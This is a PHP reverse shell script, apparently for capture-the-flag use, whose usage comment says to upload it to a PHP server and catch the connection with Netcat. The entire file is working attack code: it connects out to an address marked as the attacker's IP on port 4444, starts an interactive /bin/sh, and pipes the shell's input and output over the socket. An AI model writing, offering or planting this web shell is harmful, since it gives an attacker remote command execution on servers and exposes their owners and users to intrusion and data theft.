<?php
/**
 * CTF-PRO-AI Web Dinger
 * Usage: Upload to a PHP server and listen on your machine using Netcat.
 */
$ip = '127.0.0.1'; // Change this to your Attacker IP
$port = 4444;       // Change this to your Listener Port

$sock = fsockopen($ip, $port);
if (!$sock) { echo "[-] Connection failed"; exit(1); }

// Spawn a shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);

if (is_resource($process)) {
    // Redirect all traffic between the socket and the shell
    while (!feof($sock) && !feof($pipes[1])) {
        $read = array($sock, $pipes[1], $pipes[2]);
        $write = NULL;
        $except = NULL;
        if (stream_select($read, $write, $except, 0, 200000)) {
            if (in_array($sock, $read)) {
                fwrite($pipes[0], fread($sock, 1024));
            }
            if (in_array($pipes[1], $read)) {
                fwrite($sock, fread($pipes[1], 1024));
            }
            if (in_array($pipes[2], $read)) {
                fwrite($sock, fread($pipes[2], 1024));
            }
        }
    }
    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}
?>
